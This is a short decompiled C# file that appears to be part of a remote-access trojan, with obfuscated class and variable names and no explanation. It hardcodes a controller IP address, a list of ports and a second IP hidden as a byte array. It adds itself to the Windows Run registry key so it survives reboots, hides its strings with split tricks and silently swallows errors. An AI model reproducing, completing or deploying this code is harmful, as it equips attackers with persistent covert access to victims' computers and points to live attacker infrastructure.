using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

namespace wardhmrias;

internal static class DLAONIF
{
	public static string wardhmriasappPtath = Application.get_ExecutablePath().ToString();

	public static string wardhmriasdefaudltP = "122.216.201.108|wardhmrias".Split(new char[1] { '|' })[0];

	public static string wardhmriasmaindApp = "wardhmrias|wardhmrias".Split(new char[1] { '|' })[0];

	public static int[] ports = new int[5] { 8761, 11214, 6128, 15822, 17443 };

	public static byte[] wardhmriasvptsips = new byte[15]
	{
		49, 56, 53, 46, 49, 51, 54, 46, 49, 54,
		57, 46, 49, 53, 53
	};

	public static int wardhmriaspodrt;

	public static string wardhmriaspc_itd = "elagb|wardhmrias".Split(new char[1] { '|' })[0];

	public static string wardhmriasremvdUser = "debdrivca|wardhmrias".Split(new char[1] { '|' })[0];

	public static string wardhmriasfilesdLtogs = "reldrdmr".Split(new char[1] { '|' })[0];

	public static string wardhmriasget_mdpath()
	{
		return Path.GetDirectoryName(wardhmriasappPtath) + "\\";
	}

	public static void wardhmriasset_rdun(string app, string path)
	{
		try
		{
			string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|wardhmrias".Split(new char[1] { '|' })[0];
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
			string text = wardhmriaspc_itd;
			object value = registryKey.GetValue(text + app);
			if (value == null || value.ToString() != path)
			{
				registryKey.SetValue(text + app, path);
			}
		}
		catch
		{
		}
	}

	public static byte[] getBytedArray(string value)
	{
		MemoryStream memoryStream = new MemoryStream();
		TextWriter textWriter = new StreamWriter(memoryStream);
		textWriter.Write(value);
		textWriter.Flush();
		memoryStream.Flush();
		return memoryStream.ToArray();
	}

	public static string wardhmriasdOsname()
	{
		try
		{
			OperatingSystem oSVersion = Environment.OSVersion;
			return oSVersion.Version.Major + ">" + oSVersion.Version.Minor;
		}
		catch
		{
			return "6>1!wardhmrias".Split(new char[1] { '!' })[0];
		}
	}
}
